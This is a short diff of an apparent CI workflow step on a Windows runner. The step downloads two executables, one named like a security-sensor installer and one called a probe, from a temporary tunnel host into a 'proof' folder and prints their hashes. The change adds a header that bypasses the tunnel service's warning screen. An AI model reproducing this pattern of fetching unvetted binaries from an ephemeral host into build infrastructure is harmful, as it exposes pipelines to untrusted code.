@@ -13,8 +13,8 @@ jobs:
         run: |
           $ErrorActionPreference='Stop'
           New-Item -ItemType Directory -Force C:\proof | Out-Null
-          Invoke-WebRequest -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/FalconSensor.exe' -OutFile C:\proof\FalconSensor.exe
-          Invoke-WebRequest -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/csps4_probe.exe' -OutFile C:\proof\csps4_probe.exe
+          Invoke-WebRequest -Headers @{'X-Pinggy-No-Screen'='1'} -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/FalconSensor.exe' -OutFile C:\proof\FalconSensor.exe
+          Invoke-WebRequest -Headers @{'X-Pinggy-No-Screen'='1'} -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/csps4_probe.exe' -OutFile C:\proof\csps4_probe.exe
           $ih=(Get-FileHash C:\proof\FalconSensor.exe -Algorithm SHA256).Hash.ToLower()
           $ph=(Get-FileHash C:\proof\csps4_probe.exe -Algorithm SHA256).Hash.ToLower()
           Write-Host "installer=$ih probe=$ph"
